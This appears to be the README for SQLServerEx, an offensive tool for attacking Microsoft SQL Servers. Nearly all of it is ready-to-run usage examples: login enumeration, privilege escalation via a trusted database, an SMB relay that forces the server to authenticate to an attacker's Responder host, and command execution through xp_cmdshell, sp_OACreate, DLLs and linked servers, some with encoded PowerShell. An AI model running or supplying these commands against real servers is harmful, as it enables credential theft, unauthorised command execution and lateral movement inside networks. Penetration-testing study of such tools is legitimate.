
### MS SQL Server Command Execution

SQLServerEx is a PoC designed to execute commands / code on remote MS SQL Servers via publicly known vectors. The tool was inspired by Offensive Security courses so all kudos to them, I just put some dotNETs together.

Could be executed in both interactive and non-interactive modes providing command line arguments. Current functionality includes:

* Retrieves current user roles, linked servers and logins to be impersonated.
* Smb Relay Attack.
* Command execution via Linked Servers, Xp_cmdshell, sp_OACreate, invoking DLLs.
* PrivEsc via user impersonation and db_owner vectors.
* Reflective loading via exposed StartR method.

#### SQL server enumeration:

Could be done under current domain user context or with supplied credentials:

```
SQLServerEx.exe -s SQLSERVER1 -d master
SQLServerEx.exe -s SQLSERVER1 -u sa -p Password1
```
`-d` is an optional target database to connect. Defaults to master. Credentials are optional too.

Privilege escalation via trusted database:

```
SQLServerEx.exe -s SQLSERVER1 -e escalate -o msdb
SQLServerEx.exe -s SQLSERVER1 -u user -p MyPassword! -e escalate -o msdb
```

#### Command execution

SMB relay. Forces the SQL server to authenticate against SMB share:

```
SQLServerEx.exe -s SQLSERVER1 -d master -e relay -r RESPONDER
```

Various command execution methods. The result will include the first line of the output only. For most commands it would be the blind execution.

```
SQLServerEx.exe -s SQLSERVER1 -e xpshell -i sa -c "whoami && hostname"
SQLServerEx.exe -s SQLSERVER1 -e sp -i dbo -c "powershell -enc ZQBjAG"
SQLServerEx.exe -s SQLSERVER1 -e rundll -c "whoami && hostname"
```
`-i` is an optional user to impersonate. Defaults to sa.

Command exec on the linked SQL server:

```
SQLServerEx.exe -s SQLSERVER1 -i sa -e link -l LINKEDSQLSERVER3 -c "powershell -enc ZQBjAG"
```